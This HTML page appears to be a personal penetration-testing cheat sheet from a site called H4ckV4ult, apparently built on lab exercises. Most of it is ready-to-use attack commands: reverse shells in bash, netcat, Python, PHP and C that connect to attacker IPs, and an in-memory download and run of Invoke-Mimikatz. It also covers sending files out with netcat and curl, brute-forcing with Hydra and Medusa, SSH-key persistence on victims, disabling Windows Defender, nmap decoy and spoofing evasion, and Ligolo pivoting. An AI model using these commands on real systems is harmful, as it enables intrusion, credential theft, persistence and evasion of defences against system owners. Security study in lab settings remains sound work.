<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
    <link rel="stylesheet" href="/H4ckV4ult/styles/miscStyles.css">
    <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet"/>
    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
    <link rel="icon" type="image/x-icon" href="/H4ckV4ult/images/favicon.png">

    <title>Minimalist Webpage</title>
</head>
<body>
    <div id="navbar-container"></div>
    <script src="/H4ckV4ult/components/navbar.js"></script>
    
    <div id="navbar-container"></div>
    <div class="main-container">
        <div class="sidebar">
            <h3>Quick content</h3>
            <ul id="sidebar-menu"></ul>
        </div>

        <div class="notion-container">
                <div class="notion-header">
                    <h1 id="Webshells" class="top">Webshells</h1>
                </div>
                
                <div class="notion-body">
                    <ul>
                        <p><a class="notion-link" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"> Pentest Monkey - Webshells</a></p>
                        <p><a class="notion-link" href="https://www.revshells.com/"> Reverse shell generator</a></p>
                        <h2>Bash</h2>
                        <pre><code class="language-bash">bash -i >& /dev/tcp/TU_IP/TU_PUERTO 0>&1</code></pre>
                        <pre><code class="language-bash">nc -e /bin/sh 10.0.0.1 1234</code></pre>
                        <pre><code class="language-bash">bash -c "bash -i >& /dev/tcp/10.10.14.18/4444 0>&1"</code></pre>
                        <h2>Python</h2>
                        <pre><code class="language-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))</code></pre>
                        <h2>PHP</h2>
                        <pre><code class="language-php">php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</code></pre>
                        <pre><code class="language-php">&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.80/1234 0&gt;&amp;1'&quot;); ?&gt;</code></pre>
                        <h3>Bind shell</h3>
                        <ul>
                            <p>Client side</p>
                            <pre><code class="language-php">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f</code></pre>

                            <p>Server side</p>
                            <pre><code class="language-php">nc -nv 10.129.201.134 7777</code></pre>
                        </ul>
                    </ul>
                </div>

            <div class="notion-header">
                <h1 id="TTY treatment">TTY treatment</h1>
            </div>

            <div class="notion-body">
                    <ul>
                        <p>Steps to perform a TTY treatment.</p>
                        <pre><code class="language-python">script /dev/null -c bash
CTRL + Z
stty raw echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash</code></pre>
                    </ul>
            </div>

            <div class="notion-header">
                <h1 id="Interactive Shell">Interactive Shell</h1>
            </div>

            <div class="notion-body">
                    <ul>
                        <p>Here you can find a list of commands to spawn interactive shells inside a linux system</p>
                        <pre><code class="language-bash">/bin/sh -i                          #sh
perl —e 'exec "/bin/sh";'           #Perl
awk 'BEGIN {system("/bin/sh")}'     #awk
find . -exec /bin/sh \; -quit       #find
vim -c ':!/bin/sh'                  #vim</code></pre>
                    </ul>
                </div>    
                
            <div class="notion-header">
                <h1 id="Metasploit">Metasploit</h1>
            </div>   
            <div class="banner">
                    <a class="cherry-banner" href="/H4ckV4ult/pages/protocols/metasploit.html">
                        <h2>  Check for more information ↗️</h2>
                    </a>
            </div>  

            <div class="notion-header">
                <h1 id="Python">Python</h1>
            </div>
            <div class="notion-body">
                <ul>    
                    <h2> Upgrade terminal </h2>
                    <p>Other ways of upgrading it can be found <a class="notion-link" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat">here</a></p>
                    <pre><code class="language-python">python -c 'import pty; pty.spawn("/bin/bash")'</code> </pre>
                    <pre><code class="language-python">script /dev/null -c bash</code> </pre>
            </div>
            
             <div class="notion-header"> 
                <h1 id="Transfer Files">Transfer Files</h1>
            </div>
            
            <div class="notion-body">
                <ul>
                    <h2>NetCat</h2>
                    <ul>
                    <p>Where you recieve the file</p>
                    <pre><code class="language-python">nc -l -p 1234 -q 1 > FILE < /dev/null</code> </pre>
                    <p>From where you transfer the file</p>
                    <pre><code class="language-python">cat FILE | nc TARGET_IP TARGET_PORT</code> </pre>
                    </ul>    



                    <h2>CertUtil</h2>
                    <ul>
                    <p>It's like WGET</p>
                    <pre><code class="language-python">certutil -urlcache -split -f "http://192.168.1.1/resource"</code> </pre>
                    </ul>    




                <h2> Python </h2>
                <ul>
                <h3>Quickier way</h3>
                    <ul>
                        <p>Open Python3 http server</p>
                        <pre><code class="language-python">python3 -m http.server 8080</code> </pre>
                        <p>Acquire the file you want from  the client</p>
                        <pre><code class="language-bash">wget http://10.10.14.10:8080/file.php</code> </pre>
                        <h4>HTTP POST python</h4>
                        <ul>
                        <p>Another way is to POST the file to  transfer we need to use a virtual environment</p>
                        <pre><code class="language-bash">cd ~/Desktop/Ligolo
source venv/bin/activate
python3 -m uploadserver 8000</code> </pre>
                        <p>When transfering</p>
                        <pre><code class="language-bash">curl -X POST http://172.16.5.129:8000/upload -F "files=@gi.txt"</code> </pre>     
                        <p>When ever you finished</p>
                        <pre><code class="language-bash">deactivate</code> </pre> 
                        </ul>    
                    </ul>    
                <h3>Longer way</h3>
                <ul>
                    <h4> Server </h4>
                    <pre><code class="language-python">python3 -c "
    import socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind(('10.8.0.22', 7777))
        server_socket.listen(1)
        conn, addr = server_socket.accept()
        print(f'Conexión desde {addr}')
        with conn, open('/home/kali/github/file.sh', 'rb') as file:
            while (data := file.read(1024)):
                conn.sendall(data)
        print('Archivo enviado con éxito.')"</code></pre>
                    <h4> Client </h4>
                    <pre><code class="language-python">python3 -c "
    import socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect(('10.8.0.22', 7777))
        print('Conectado al servidor.')
        with open('/var//linpeas.sh', 'wb') as file:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                file.write(data)
        print('Archivo recibido con éxito y guardado como archivo_recibido.txt.')"</code></pre>
            </ul>
        </ul>


                <h2>SMB</h2>
                <ul>
                    <p>Open smb server</p>
                    <pre><code class="language-python">impacket-smbserver share . </code> </pre>
                    <p>From windows </p>
                    <pre><code class="language-python">copy \\10.10.14.10\SHARE\pr.exe C:\Windows\Temp\pr.exe</code></pre>
                </ul>

                <h2>FTP</h2>
                <ul>
                    <p>Open ftp server</p>
                    <pre><code class="language-python">python3 -m pyftpdlib --port 21</code> </pre>
                    <p>From windows </p>
                    <pre><code class="language-python">(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')</code></pre>
                </ul>


                <h2>SCP</h2>
                <ul>
                    <p>From Kali to Windows</p>
                    <pre><code class="language-bash">scp /ruta/en/kali/archivo.exe Nadine@10.10.10.184:"C:/Users/Nadine/Desktop/archivo.exe"</code> </pre>
                    <p>From Windows to Kali </p>
                    <pre><code class="language-cmd">scp "nadine@10.10.10.184:/C:/RecData/RecordInfoDB.db3" .</code></pre>
                </ul>

                <h2>Base64</h2>
                <ul>
                    <h3>Windows</h3>
                    <ul>
                        <pre><code class="language-bash">base64 -w 0 file.sh</code></pre>
                        <pre><code class="language-powershell">[IO.File]::WriteAllBytes("C:\Users\Public\file.sh", [Convert]::FromBase64String("d2h5IGFyZSB5b3Ugd2FzdGluZyB5b3VyIHRpbWUuIEhBQ0sgaW5zdGVhZA=="))</code></pre>
                        <p>Reverse operation</p>
                        <pre><code class="language-powershell">[Convert]::ToBase64String((Get-Content -path "C:\Users\Public\file.sh" -Encoding byte))</code></pre>
                        
                    </ul>

                    <h3>Linux</h3>
                    <ul>
                        <pre><code class="language-bash">base64 -w 0 file.sh</code></pre>
                        <p>Copy the string an paste it in the new machine to decode it and generate the new file</p>
                        <pre><code class="language-bash">echo d2h5IGFyZSB5b3Ugd2FzdGluZyB5b3VyIHRpbWUuIEhBQ0sgaW5zdGVhZA== | base64 -d > file.sh</code></pre>
                    </ul>
                </ul>

                <h2>Other Windows methods</h2>
                <p>More examples <a class="notion-link" href="https://gist.github.com/HarmJ0y/bb48307ffa663256e239">Here</a></p>
                <ul>
                 <p>Download from web resource</p>                
                 <pre><code class="language-powershell">(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com//PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')</code></pre>
                 <p>Run it directly in memory</p>
                 <pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')</code></pre>
                </ul>
            </div>    

            <div class="notion-header"> 
                <h1 id="C">C</h1>
            </div>

            <div class="notion-body">
                <ul>
                    <h2>Reverse shell with C</h2>
                    <pre><code class="language-c">#include &lt;unistd.h&gt;
int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.22/8888 0>&1", NULL);
    return 0;
}
</code></pre>
                </ul> 
            </div>   
            
            <div class="notion-header"> 
                <h1 id="Sync clock rate (Windows)">Sync clock rate (Windows)</h1>
            </div>

            <div class="notion-body">
                <ul>
                    <p>For some windows attacks it is necessary to sync you clock rate with the victim's</p>
                    <p>Check current time</p>
                    <pre><code class="language-bash">timedatectl</code></pre>
                    <p>Sync time with the server</p>
                    <pre><code class="language-bash">sudo ntpdate VICTIM_IP</code></pre>
                    <p>Deactivate sync</p>
                    <pre><code class="language-bash">sudo timedatectl set-ntp true</code></pre>
                    
                </ul>
            </div>

            <div class="notion-header"> 
                <h1 id="Brute Force">Brute Force</h1>
            </div>

            <div class="notion-body">
                <ul>
                    <h2>Default credentials</h2>
                    <ul>
                        <p>This are several ways of bruteforcing using crackmapexec</p>
                        <p>You can always check for default credentials using</p>
                     
                    <pre><code class="language-bash">creds search mysql</code></pre>
                    </ul>
                    
                    <h2>Developing a username wordlist</h2>
                    <ul>
                        <p>In case we found names and surnames of employees we can try to guess it's usernames by using <b>Username-anarchy</b>. This will create different combinations with the provided names</p>
                        <pre><code class="language-bash">./username-anarchy -i /home/ltnbob/names.txt t</code></pre>
                        <p>Another way in case we are targeting an specific account is using cupp which will ask several questions about or victim in order to generate a wordlist</p>
                        <pre><code class="language-bash">cupp -i</code></pre>
                        <p>In both cases we can filter the results based on the password policy</p>
                        <pre><code class="language-bash">grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt</code></pre>
                        <p>It first ensures a minimum length of 6 characters, then checks for at least one uppercase letter, one lowercase letter, one number, and finally, at least two special characters from the specified set.</p>    
                        
                    </ul>
                    <h2>Examples of bruteforcing</h2>
                    <ul>
                    <pre><code class="language-bash">crackmapexec smb 10.10.10.184 -u USERNAME -p passwords.txt
crackmapexec ftp 10.10.10.184 -u USERNAME -p passwords.txt
crackmapexec ssh 10.10.10.184 -u USERNAME -p passwords.txt</code></pre>
                    <h3>hydra</h3>
                    <ul>
                    <pre><code class="language-bash">hydra -L user.list -P password.list ssh://10.129.42.197
hydra -L user.list -P password.list drp://10.129.42.197
hydra -L user.list -P password.list smb://10.129.42.197
#Another valid way
hydra -L user.list -P password.list 10.129.42.197 smb</code></pre>
                    <p>Specific example of performing bruteforce to a website</p>    
                    <pre><code class="language-bash">#Single user a lot of passwords incorrect is a specific string which shows a loggin attempt has failed
hydra -l admin -P password.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
#Look for response code 302  
hydra -l admin -P password.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:S=302"
#Using two wordlists
hydra -L shortlist.txt -P passwords.txt -f 94.237.120.119 -s 52867 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid"
#Bruteforcing basic auth. The one with the tipical alert which say username and password   
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt TARGET_IP http-get / -s PORT</code></pre>

                   <p>Advanced RDP brute forcing generating passwords from 6 to 8 of length</p>     
                   <pre><code class="language-bash">hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp</code></pre>  
                    </ul>

                    <h3>Medusa</h3>
                    <ul>
                        <p>Basic examples</p>
                        <pre><code class="language-bash">medusa -M ftp -h 192.168.1.100 -U users.txt -P passwords.txt #In case you would like single user and password use -u and -p (-n parameter for specific port)
#Brute-forcing login forms on web applications over HTTP (GET/POST).
medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^
#Brute-forcing login forms on websites using HTTP POST requests.
medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"
#Basic HTTP authentication
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
#Testing for Empty or Default Passwords
medusa -h 10.0.0.5 -U usernames.txt -e ns -M ssh</code></pre>
                        
                    </ul>
                    
                </ul>
                    

                   <h2>Useful wordlists to enum website </h2>
                   <ul>
                   <p>Start with directory listing</p>
                   <pre><code class="language-bash">/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-large.txt</code></pre>
                   
                   <p>In case you coudn't find anything go on with  </p>
                   <pre><code class="language-bash">/usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt     
/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt</code></pre>

                    <p>Finally desperately use</p>
                    <pre><code class="language-bash">/usr/share/wordlists/seclists/Discovery/Web-Content/big.txt</code></pre>
                    </ul>

                    <h2>Useful wordlist to enumerate users</h2>
                    <ul>
                    <pre><code class="language-bash">https://github.com/insidetrust/statistically-likely-usernames #Based on the username format
/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt</code></pre>
                    </ul>

                    <h2>Useful wordlist for password cracking</h2>
                    <ul>
                    <pre><code class="language-bash">/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
/usr/share/wordlists/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt</code></pre>



                    <p></p>

                </ul>
            </div>


            <div class="notion-header"> 
                <h1 id="Persistance">Persistance</h1>
            </div>

            <div class="notion-body">
                <ul>
                    <p>This is a simple method to persist in a system using SSH. You can apply this process for any user inside the system</p>
                    <p>On your attacker machine generate a public key</p>
                    <pre><code class="language-bash">ssh-keygen

Generating public/private ed25519 key pair.
Enter file in which to save the key (/root/.ssh/id_ed25519): persist
Enter passphrase for "persist" (empty for no passphrase): 
Enter same passphrase again:</code></pre>
                    <p>Change public key file permissions to private key</p>
                    

                    <p>Transfer the public key file to the victim (persist.pub) and add it's content to authorized_keys file </p>
                    <pre><code class="language-bash">cat persist.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPqRDQ0mTYDYnx0cJOUWyNGGrhhjYddfIIoO9HkopkTg root@kali

echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPqRDQ0mTYDYnx0cJOUWyNGGrhhjYddfIIoO9HkopkTg root@kali" >> authorized_keys</code></pre>        
                   <p>Connect to the victims using private key</p> 
                   <pre><code class="language-bash">ssh -i persist root@10.10.10.187</code></pre> 
                  
                </ul>
            </div>

            <div class="notion-header"> 
                <h1 id="File Encryption">File Encryption</h1>
            </div>

            <div class="notion-body">
                <ul>
                <h3>Windows</h3>
                <ul>    
                   <p>It is a must to import module <b>Invoke-AESEncryption.ps1</b> (Import-Module .\Invoke-AESEncryption.ps1)</p> 
                   <p>Simple ways of applying encryption to file</p>
                   <p>Powershell AES encrypt</p> 
                   <pre><code class="language-powershell">Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin</code></pre> 
                   <p>Powershell AES decrypt</p> 
                   <pre><code class="language-powershell">Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes</code></pre> 
                </ul>

                <h3>Linux</h3>
                <ul>    
                   <p>Encryt file using openssl. A password must be provided when using this command. This one will be used to decrypt</p> 
                   <pre><code class="language-powershell">openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc</code></pre> 
                   <p>openssl decrypt</p> 
                   <pre><code class="language-powershell">openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd</code></pre> 
                </ul>
                </ul>
            </div>


            <div class="notion-header"> 
                <h1 id="IDS/Firewall Evasion">IDS/Firewall Evasion</h1>
            </div>

            <div class="notion-body">
                <ul>
                    <h2>Evasion using nmap</h2>
                    <ul>
                    <p>Here you can find some ways to be sneaky with nmap</p>
                    <p><b>-Pn</b> Disables ICMP requests, <b>-sA</b> Performs ACK scan on specified ports.</p>
                    <pre><code class="language-bash">sudo nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace</code></pre> 
                    <pre><code class="language-bash">sudo nmap 10.129.2.28 -p 21,22,25 -sS -Pn -n --disable-arp-ping --packet-trace</code></pre> 
                    <p><b>-D</b> Generates random IP address and this ones are inserted in the IP header. In this case 5</p>
                    <pre><code class="language-bash">sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5</code></pre> 
                    <p><b>-S</b> Scan by specifiying a diferent source address</p>
                    <pre><code class="language-bash">sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0</code></pre>
                    <p><b>--source-port 53</b> This method could be fundamental to us if we are in a demilitarized zone (DMZ). The company's DNS servers are usually more trusted than those from the Internet. So, for example, we could use them to interact with the hosts of the internal network </p>
                    <pre><code class="language-bash">sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
ncat -nv --source-port 53 10.129.2.28 50000 #Then connect to the port</code></pre>
                    </ul>        
                

                    <h2>Detecting WAF</h2>
                    <ul>
                        <p>Using the tool <b>wafw00f</b></p>
                        <pre><code class="language-bash">wafw00f inlanefreight.com
[*] Checking https://inlanefreight.com
[+] The site https://inlanefreight.com is behind Wordfence (Defiant) WAF.
[~] Number of requests: 2</code></pre>
                    </ul>

                    <h2>Disabling AV in Windows</h2>
                    <ul>
                        <p>By using the following comand</p>
                        <pre><code class="language-bash">Set-MpPreference -DisableRealtimeMonitoring $true</code></pre>

                    </ul>
                </ul>
            </div>

            <div class="notion-header">
                <h1 id="Bash scripting">Bash scripting</h1>
            </div>   
            <div class="banner">
                    <a class="cherry-banner" href="/H4ckV4ult/pages/protocols/bashScripting.html">
                        <h2>Check for more information ↗️</h2>
                    </a>
            </div>
            
            <div class="notion-header">
                <h1 id="Cracking passwords">Cracking passwords</h1>
            </div>   
            <div class="banner">
                    <a class="cherry-banner" href="/H4ckV4ult/pages/protocols/cracking.html">
                        <h2>Check for more information ↗️</h2>
                    </a>
            </div>


            <div class="notion-header">
                <h1 id="Passwords over the network">Passwords over the network</h1>
            </div>   
            <div class="banner">
                <ul>
                        <p>It is possible to capture passwords over the network or even scan a package capture (.pcap) in order to find passwords. To do se we can use the tool <b>pcredz</b></p>
                        <pre><code class="language-bash">python3 Pcredz -f ../Desktop/demo.pcapng</code></pre>
                </ul>    
            </div>

            <div class="notion-header">
                <h1 id="Pivoting Ligolo">Pivoting Ligolo</h1>
            </div>   
            <div class="banner">
                <ul>
                    <p>Here we'll show the steps in order to use ligolo and pivot over networking. In order to make it clear we will steup a environment as following</p>
                    <p> Box1 (Attacker) 10.10.14.100</p>
                    <p> Box2 (DMZ) 10.120.113.73, 172.16.5.129</p>
                    <p> Box3 (Internal) 172.16.5.19</p>
                    <p>As you can see Box1 can only talk to box2 and box3 can only talk to box2</p>

                    <p>Using ligolo we will be able to talk to any box. First of all we need to download the agent and the proxy from their offical site <a class="notion-link" href="https://github.com/nicocha30/ligolo-ng/releases">here</a></p>
                    <p>Have in mind that based on the operating system the proxy and agent will change. <b>Proxy runs over our machine and agent runs over the intermediate machine</b></p>
                    <h2>Setup</h2>
                    <ul>
                    <p>Create a network interface for ligolo</p>
                    <pre><code class="language-bash">sudo ip tuntap add user $USER mode tun ligolo</code></pre>
                    <p>Change state of network interface</p>
                    <pre><code class="language-bash">sudo ip link set ligolo up</code></pre>
                    <p>Create a route in the routing table <b> The address must the IP address of the box we would like to access finally in that case box3</b></p>
                    <pre><code class="language-bash">sudo ip route add 172.16.5.0/24 dev ligolo</code></pre>
                    <p>Start proxy on kali machine</p>
                    <pre><code class="language-bash">./proxy -selfcert </code></pre>
                    <p>Transfer the agent to the intermediate machine and start it using</p>
                    <pre><code class="language-bash">./agent -connect 10.10.14.100:11601 -ignore-cert (That is the IP of the kali machine)</code></pre>
                    <p>At this point a new agent should appear in the proxy. To finish we will start the tunnel doing</p>
                    <pre><code class="language-bash">ligolo-ng » session
? Specify a session : 1 - ubuntu@WEB01 - 10.129.113.73:57336 - 005056b0f45a
[Agent : ubuntu@WEB01] » start</code></pre>
                    <p>From now everything will be connected and from our kali machine we should be able to ping the box3 </p>
                    </ul>

                    <h2>Double pivoting & more</h2>
                    <ul>   
                        <p>Setup a listener in order to redirect traffic and permit the agent to connect</p>
                        <pre><code class="language-bash">listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601</code></pre>
                        <p>Connect the agent</p>
                        <pre><code class="language-bash">agent_w.exe --connect 172.16.5.15:11601 -ignore-cert</code></pre>
                        <p>Create interfaces and routes for the second pivoting (Remember to adapt the ip address and more)</p>
                        <pre><code class="language-bash">sudo ip tuntap add user $USER mode tun ligolo-double
sudo ip link set ligolo-double up
sudo ip route add 172.16.0.0/16 dev ligolo-double</code></pre>
                        <p>Finally Start tunnel, select session 2 and type:</p>
                        <pre><code class="language-bash">tunnel_start --tun ligolo-double</code></pre>
                        
                        <h3>In case you would like a third pivot it is the same process</h3>
                        <ul>
                            <p>Create listener to allow connection from the agent. Always to 127.0.0.01:11601</p>
                            <pre><code class="language-bash">listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601</code></pre>
                            <p>Connect agent. Remember that always connect to the interface of the last host</p>
                            <pre><code class="language-bash">agent_w.exe -connect 172.16.6.35:11602 -ignore-cert</code></pre>
                            <p>Create interfaces and routes</p> 
                            <pre><code class="language-bash">sudo ip tuntap add user $USER mode tun ligolo-triple
sudo ip link set ligolo-triple up
sudo ip route add 172.16.10.0/24 dev ligolo-triple</code></pre>
                            <p>Start the tunnel by selectig session 3 and typing:</p>
                            <pre><code class="language-bash">tunnel_start --tun ligolo-triple</code></pre>    
                        </ul>
                        <p>And so on with more pivoting</p>
                    </ul>    

                    <h2>Reverse shell (pivoting)</h2>
                    <ul>
                        <p>In order to reach from box3 the box1 just in case you would like to perform a reverse shell we need to setup a listener </p>
                        <p>From proxy panel type: With that, all trafic that comes to the proxy from port 4444 will be redirected to localhost (kali) port 44</p>
                        <pre><code class="language-bash">listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:44</code></pre>    
                        <p>We can check all the listeners by using <b>listener_list</b></p>
                        <p>Finally in order to transfers files from box3 we need to point the second interface of the box2 the one we can comunicate from box3</p>
                        <pre><code class="language-bash">ping 172.16.5.129</code></pre>
                        <b>In metasploit is the same thing in localhost you must indicate 0.0.0.0 and in lport you must indicate 44</b>
                    </ul>

                    <h2>Cleaning out</h2>
                    <ul>
                        <p>In order to revert all changes we must delete the route</p>
                        <pre><code class="language-bash">sudo ip route del 192.168.10.0/24 dev ligolo</code></pre>
                        <p>Delete de device</p>        
                        <pre><code class="language-bash">sudo ip link del ligolo</code></pre>        
                    </ul>


                    <h2>Host identification</h2>
                    <ul>
                        <p>As it is likely that nmap does not work to identify hosts we can perform ping sweep from our kali or the compromised host</p>
                        <b>Linux</b>
                        <pre><code class="language-bash">for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done</code></pre>
                        <b>Windows</b>        
                        <pre><code class="language-bash">$network = "172.16.5"
1..254 | ForEach-Object {
    $ip = "172.16.10.$_"
    Write-Host "[*] Pingeando $ip ..." -NoNewline
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -ErrorAction SilentlyContinue) {
        Write-Host "  UP" -ForegroundColor Green
    } else {
        Write-Host "  DOWN" -ForegroundColor DarkGray
    }
}
</code></pre>        
                    <b>Wireshark</b>
                    <p>Filtering by arp in wireshark and waiting a little bit allow us to identify hosts</p>
                    <b>fping</b>
                    <pre><code class="language-bash">fping -asgq 172.16.5.0/24</code></pre>

                    </ul>

                    
                 

                    
                    
                    



                </ul>    
            </div>
                    
        </ul>
        </div>
    </div>

    <!-- Mover el script al final del body para asegurar que todo el DOM esté cargado -->
    <script>
        
        function generateMenu(){
            const headers = document.querySelectorAll('.notion-container h1');
            const sidebarList = document.querySelector('#sidebar-menu');

            headers.forEach(header => {
                const listItem = document.createElement('li');
                const link = document.createElement('a');
                link.textContent = header.textContent;
                link.setAttribute('href', `#${header.textContent}`);
                listItem.appendChild(link);
                sidebarList.appendChild(listItem);
            });
        }

        // Asegurarse de que ambas funciones se ejecuten después de que todo el contenido esté listo
        window.addEventListener('load', generateMenu);
    </script>
</body>
</html>
